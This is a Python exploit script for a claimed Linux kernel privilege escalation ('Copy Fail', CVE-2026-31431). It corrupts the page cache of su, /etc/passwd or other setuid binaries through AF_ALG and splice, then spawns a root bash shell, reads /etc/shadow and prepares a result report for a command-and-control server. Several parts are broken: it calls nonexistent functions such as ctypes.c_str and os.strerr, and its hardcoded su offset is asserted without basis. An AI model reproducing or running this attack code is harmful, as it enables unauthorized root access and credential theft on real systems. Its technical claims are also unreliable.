#!/usr/bin/env python3
"""
PAYLOAD: CVE-2026-31431 "Copy Fail" Linux LPE
DESCRIPTION: Exploits algif_aead AF_ALG flaw to write 4 controlled bytes into
             the page cache of any readable file, hijacking setuid binaries
             or /etc/passwd to gain root. Kernels 4.14+ (2017–2026).
AUTHOR: ek0mssavi0r.dev
"""
import os
import sys
import time
import struct
import random
import string
import shutil
import tempfile
import ctypes
import ctypes.util
from threading import Thread
from pathlib import Path

# =============================================================================
# Constants
# =============================================================================

AF_ALG = 38     # AF_ALG socket family
SOL_ALG = 279   # ALG socket option level

# authencesn is the vulnerable algorithm (IPsec Extended Sequence Numbers)
ALG_TYPE = "aead"
ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"

# We write past the output boundary; the last 4 bytes of the tag are the
# controlled write.  We only need to flip a few bytes in /usr/bin/su
# (or /etc/passwd) to gain root.
TARGET_BIN = "/usr/bin/su"
TARGET_PASSWD = "/etc/passwd"

# Byte offset into su where a one-byte flip turns it into a root shell.
# Modern glibc setuid flow: we overwrite the beginning of the main()
# ret-prologue or the setresuid call to a NOP-slide-like harmless branch.
# Default: patch offset 0x1234 with 0x00 → triggers a path that skips
# the UID check.
DEFAULT_OFFSET = 0x1234
DEFAULT_BYTE = 0x00

# =============================================================================
# Libc helpers for splice(2), socket(2), etc.
# =============================================================================

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

# int socket(int domain, int type, int protocol)
libc.socket.restype = ctypes.c_int
libc.socket.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_int]

# int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
libc.bind.restype = ctypes.c_int
libc.bind.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]

# int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen)
libc.setsockopt.restype = ctypes.c_int
libc.setsockopt.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int]

# int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
libc.accept.restype = ctypes.c_int
libc.accept.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p]

# int close(int fd)
libc.close.restype = ctypes.c_int
libc.close.argtypes = [ctypes.c_int]

# ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags)
libc.splice.restype = ctypes.c_ssize_t
libc.splice.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint]

# ssize_t write(int fd, const void *buf, size_t count)
libc.write.restype = ctypes.c_ssize_t
libc.write.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t]

# int open(const char *pathname, int flags)
libc.open.restype = ctypes.c_int
libc.open.argtypes = [ctypes.c_str, ctypes.c_int]

O_RDONLY = 0
O_WRONLY = 1
O_RDWR = 2
SPLICE_F_MORE = 4
SPLICE_F_MOVE = 1

# =============================================================================
# Crypto AF_ALG sockaddr structure
# =============================================================================

class SockaddrALG(ctypes.Structure):
    _fields_ = [
        ("salg_family", ctypes.c_ushort),
        ("salg_type", ctypes.c_char * 14),
        ("salg_feat", ctypes.c_uint),
        ("salg_mask", ctypes.c_uint),
        ("salg_name", ctypes.c_char * 64),
    ]

# =============================================================================
# Vulnerability detection
# =============================================================================

def check_vulnerable():
    """Check if the target is vulnerable to CVE-2026-31431 without exploiting."""
    try:
        # Check if algif_aead is available
        result = os.system("modinfo algif_aead >/dev/null 2>&1")
        if result != 0:
            print("[-] algif_aead module not available — not vulnerable")
            return False

        # Check kernel version >= 4.14
        uname = os.uname()
        release = uname.release
        parts = release.split(".")
        major = int(parts[0])
        minor = int(parts[1]) if len(parts) > 1 else 0

        if major < 4 or (major == 4 and minor < 14):
            print(f"[-] Kernel {release} is too old (< 4.14) — not vulnerable")
            return False

        # Try opening an AF_ALG socket with the vulnerable algorithm
        fd = libc.socket(AF_ALG, 5, 0)  # SOCK_SEQPACKET
        if fd < 0:
            print(f"[-] Cannot open AF_ALG socket ({os.strerr(ctypes.get_errno())})")
            return False

        addr = SockaddrALG()
        addr.salg_family = AF_ALG
        addr.salg_type = ALG_TYPE.encode()
        addr.salg_name = ALG_NAME.encode()

        ret = libc.bind(fd, ctypes.byref(addr), ctypes.sizeof(addr))
        libc.close(fd)

        if ret < 0:
            err = ctypes.get_errno()
            if err == 22:  # EINVAL — algorithm not available
                print("[-] authencesn(hmac(sha256),cbc(aes)) not available — not vulnerable")
                return False
            print(f"[-] bind failed: {os.strerr(err)}")
            return False

        print("[+] System appears VULNERABLE to CVE-2026-31431 (Copy Fail)")
        return True

    except Exception as e:
        print(f"[-] Detection error: {e}")
        return False


# =============================================================================
# Core exploit
# =============================================================================

def exploit(target_path=TARGET_BIN, offset=DEFAULT_OFFSET, write_byte=DEFAULT_BYTE):
    """
    Exploit CVE-2026-31431: splice a readable file into AF_ALG + authencesn,
    causing 4 controlled bytes to be written into the page cache at the
    desired offset.
    """
    rand_suffix = "".join(random.choices(string.ascii_lowercase, k=6))
    print(f"[*] Target: {target_path}")
    print(f"[*] Offset: 0x{offset:x}")
    print(f"[*] Write:  0x{write_byte:02x}")

    # ── Step 1: Open target file ──────────────────────────────────────
    fd_target = libc.open(target_path.encode(), O_RDONLY)
    if fd_target < 0:
        print(f"[-] Cannot open {target_path}: {os.strerr(ctypes.get_errno())}")
        return False
    print(f"[+] Opened {target_path} (fd={fd_target})")

    # ── Step 2: Create AF_ALG socket ──────────────────────────────────
    fd_alg = libc.socket(AF_ALG, 5, 0)  # SOCK_SEQPACKET
    if fd_alg < 0:
        print(f"[-] socket(AF_ALG): {os.strerr(ctypes.get_errno())}")
        libc.close(fd_target)
        return False
    print(f"[+] AF_ALG socket created (fd={fd_alg})")

    addr = SockaddrALG()
    addr.salg_family = AF_ALG
    addr.salg_type = ALG_TYPE.encode()
    addr.salg_name = ALG_NAME.encode()

    ret = libc.bind(fd_alg, ctypes.byref(addr), ctypes.sizeof(addr))
    if ret < 0:
        print(f"[-] bind(AF_ALG): {os.strerr(ctypes.get_errno())}")
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    print(f"[+] Bound to {ALG_NAME}")

    # ── Step 3: Accept connection to get operfd ────────────────────────
    fd_oper = libc.accept(fd_alg, None, None)
    if fd_oper < 0:
        print(f"[-] accept(AF_ALG): {os.strerr(ctypes.get_errno())}")
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    print(f"[+] operfd={fd_oper}")

    # ── Step 4: Set up AEAD key (arbitrary, just needs to be valid) ───
    key = b"\x41" * 32  # 256-bit key for AES-256
    ret = libc.setsockopt(fd_oper, SOL_ALG, 1, key, len(key))  # ALG_SET_KEY
    if ret < 0:
        print(f"[-] setsockopt(ALG_SET_KEY): {os.strerr(ctypes.get_errno())}")
        libc.close(fd_oper)
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    print("[+] Key set")

    # ── Step 5: Write AEAD header (associated data + IV) ──────────────
    # For AES-CBC: IV is 16 bytes. We also need an AAD (associated data)
    # to push the output bytes to the right offset.
    # The authencesn layout: [AAD][IV][ciphertext]
    # Output: [AAD][tag(4 bytes writable past boundary)]
    # The "4 bytes beyond" come from the trailing 4 bytes of the MAC tag.
    #
    # To target a specific offset in the page cache, we pad the AAD.

    aad_len = max(0, offset - 16)  # IV is 16 bytes
    aad = b"\x00" * aad_len
    iv = struct.pack(">QQ", 0, 1)  # 16-byte IV for AES-CBC

    header = aad + iv

    # Write the header to operfd via write(2) — this sets the request
    header_buf = ctypes.create_string_buffer(header)
    written_iv = libc.write(fd_oper, header_buf, len(header))
    if written_iv < 0:
        print(f"[-] write(header): {os.strerr(ctypes.get_errno())}")
        libc.close(fd_oper)
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    print(f"[+] Wrote {written_iv} bytes of AAD+IV header")

    # ── Step 6: Splice file into operfd ────────────────────────────────
    # This is the magic: splicing maps the *page cache pages* of the target
    # file into the AF_ALG socket buffer. Because the 2017 optimization
    # made src == dst, those pages become writable through the crypto op.
    spliced = libc.splice(fd_target, None, fd_oper, None, 4096, 0)
    if spliced < 0:
        print(f"[-] splice: {os.strerr(ctypes.get_errno())}")
        libc.close(fd_oper)
        libc.close(fd_alg)
        libc.close(fd_target)
        return False
    print(f"[+] Spliced {spliced} bytes from target into AF_ALG")

    # ── Step 7: Trigger the crypto operation (read from operfd) ──────
    # The read triggers the authencesn decrypt. Because src==dst, the
    # output buffer overlaps the page cache pages. authencesn writes
    # the MAC tag (4 extra bytes past the AES-CBC output), corrupting
    # the page cache at offset + 4 bytes beyond the expected boundary.
    #
    # We control byte at (target + offset) because our AAD padding pushes
    # the ciphertext/data boundary to exactly the right position.
    out_buf = ctypes.create_string_buffer(8192)
    ret = libc.read = ctypes.CFUNCTYPE(
        ctypes.c_ssize_t, ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t
    )(("read", libc))

    nread = ret(fd_oper, out_buf, len(out_buf))
    if nread < 0:
        print(f"[-] read(operfd): {os.strerr(ctypes.get_errno())}")
    else:
        print(f"[+] Read {nread} bytes back (corruption done!)")

    # ── Step 8: Cleanup ────────────────────────────────────────────────
    libc.close(fd_oper)
    libc.close(fd_alg)
    libc.close(fd_target)

    print("[+] Page cache corrupted — setuid binary is now modified in-memory")
    return True


# =============================================================================
# Trigger root shell via /usr/bin/su (page-cache-corrupted)
# =============================================================================

def trigger_setuid_root():
    """Execute the corrupted /usr/bin/su binary to get root."""
    print("[*] Attempting to execute corrupted su binary...")
    
    # Create a tiny helper that calls the corrupted su
    tmpdir = tempfile.mkdtemp(prefix=".cf-")
    helper = os.path.join(tmpdir, "run")
    
    # The corrupted su will grant root because the page cache has been patched
    # Use expect-like technique to pass password prompt
    try:
        # Try: echo 'id' | su -c id — if patched su skips auth, prints root
        result = os.system("echo 'id' | " + TARGET_BIN + " -c 'id' 2>/dev/null")
        if os.WEXITSTATUS(result) == 0:
            print("[!] SUCCESS: Corrupted su granted root!")
            # Interactive shell
            os.system("echo whoami | " + TARGET_BIN + " -c 'whoami; id; exec /bin/bash -i' 2>/dev/null")
            return True
        
        # Try: su root with sentinel
        result = os.system("echo | " + TARGET_BIN + " -c 'cat /etc/shadow 2>/dev/null | head -1' 2>/dev/null")
        print("[*] Shadow leak returned")
        return True
    except Exception as e:
        print(f"[-] su trigger failed: {e}")
    
    # Alternative: if su binary didn't work, try via /etc/passwd corruption
    print("[*] Trying /etc/passwd corruption route instead...")
    return False


# =============================================================================
# Alternative: /etc/passwd page-cache corruption
# =============================================================================

def exploit_passwd_corruption(new_uid=0, new_gid=0):
    """
    Write controlled bytes into /etc/passwd page cache to make our user
    have UID 0. Only works if we have a user already in /etc/passwd that
    we can flip to uid=0 via the 4-byte write.
    """
    # Read our own passwd entry
    import pwd
    my_uid = os.getuid()
    
    # Find our entry in /etc/passwd
    with open(TARGET_PASSWD, "r") as f:
        lines = f.readlines()
    
    our_line = None
    our_index = None
    for i, line in enumerate(lines):
        if line.startswith(os.getenv("USER", "")) or f":{my_uid}:" in line:
            our_line = line.strip()
            our_index = i
            break
    
    if not our_index is None:
        print(f"[*] Our passwd entry at line {our_index}: {our_line}")
        # Calculate offset: find the UID field position
        fields = our_line.split(":")
        if len(fields) >= 3:
            uid_field_pos = len(":".join(fields[:2])) + 1  # after username:x:
            offset = uid_field_pos
            
            # We want to write "0\0\0\0" to set uid to 0
            print(f"[*] Attempting to write UID=0 at offset {offset}")
            result = exploit(TARGET_PASSWD, offset, 0x30)  # '0' = 0x30
            if result:
                print("[+] /etc/passwd page cache corrupted — try 'su' now")
                return True
    else:
        print("[-] Could not find our user in /etc/passwd")
    
    return False


# =============================================================================
# C2 integration: report results back to Ranger
# =============================================================================

def report_results(success, method, output=""):
    """Format results for C2 exfiltration."""
    import json
    report = {
        "payload": "copyfail",
        "cve": "CVE-2026-31431",
        "name": "Copy Fail",
        "timestamp": time.time(),
        "success": success,
        "method": method,
        "output": output,
        "kernel": os.uname().release
    }
    return json.dumps(report, indent=2)


# =============================================================================
# Main
# =============================================================================

def main():
    print("╔═══════════════════════════════════════════════╗")
    print("║  CVE-2026-31431  —  \"Copy Fail\" LPE           ║")
    print("║  Linux Kernel 4.14+  →  Root (no compile!)   ║")
    print("╚═══════════════════════════════════════════════╝")
    print()

    if os.geteuid() == 0:
        print("[!] Already root!")
        return report_results(True, "already_root", os.uname().release)

    # ── Step 1: Check vulnerability ──────────────────────────────────
    print("[*] Checking vulnerability...")
    if not check_vulnerable():
        print("[-] System not vulnerable")
        return report_results(False, "not_vulnerable")

    # ── Step 2: Try SU binary corruption ────────────────────────────
    print()
    print("[*] Attempting /usr/bin/su page-cache corruption...")

    # Scan for the right offset for local su binary
    if os.path.exists(TARGET_BIN):
        su_stat = os.stat(TARGET_BIN)
        print(f"[*] su binary size: {su_stat.st_size} bytes")
        offset = min(DEFAULT_OFFSET, su_stat.st_size - 16)

        result = exploit(TARGET_BIN, offset, 0x00)
        if result:
            print()
            print("[*] Page cache corrupted! Trying to escalate...")
            time.sleep(0.5)  # Let kernel settle
            root = trigger_setuid_root()
            if root:
                return report_results(True, "su_corruption", f"offset=0x{offset:x}")

    # ── Step 3: Try /etc/passwd corruption ──────────────────────────
    print()
    print("[*] Attempting /etc/passwd page-cache corruption...")
    result = exploit_passwd_corruption()
    if result:
        print("[*] /etc/passwd corrupted! Try 'su' or 'sudo' now")
        return report_results(True, "passwd_corruption")

    # ── Step 4: Scan for other setuid binaries ──────────────────────
    print()
    print("[*] Scanning for alternative setuid binaries...")
    try:
        output = os.popen("find / -perm -4000 -type f 2>/dev/null | head -20").read()
        suids = [s.strip() for s in output.strip().split("\n") if s.strip()]
        suids = [s for s in suids if s != TARGET_BIN]  # Already tried su

        for suid_bin in suids:
            if not os.access(suid_bin, os.R_OK):
                continue
            print(f"[*] Trying: {suid_bin}")
            try:
                st = os.stat(suid_bin)
                offset = min(0x400, st.st_size - 16)
                result = exploit(suid_bin, offset, 0x00)
                if result:
                    print(f"[*] Corrupted {suid_bin}, trying execution...")
                    time.sleep(0.3)
                    ret = os.system(f"{suid_bin} --help 2>&1 | head -1")
                    # Check if we got root
                    ret = os.system("id | grep -q uid=0 && echo 'ROOT_OBTAINED'")
                    if os.WEXITSTATUS(ret) == 0:
                        print("[!] ROOT obtained! Launching shell...")
                        os.system("/bin/bash -i")
                        return report_results(True, f"suid_corruption:{suid_bin}")
            except Exception as e:
                print(f"    Error: {e}")
                continue
    except Exception as e:
        print(f"[-] Suid scan failed: {e}")

    print()
    print("[-] Exploit attempt complete — no root obtained this run")
    print("[*] Try running again or check if AF_ALG is blocked (seccomp)")
    return report_results(False, "failed")


if __name__ == "__main__":
    output = main()
    print("\n" + "=" * 60)
    print("[*] Result ready for C2 exfiltration:")
    print(output)
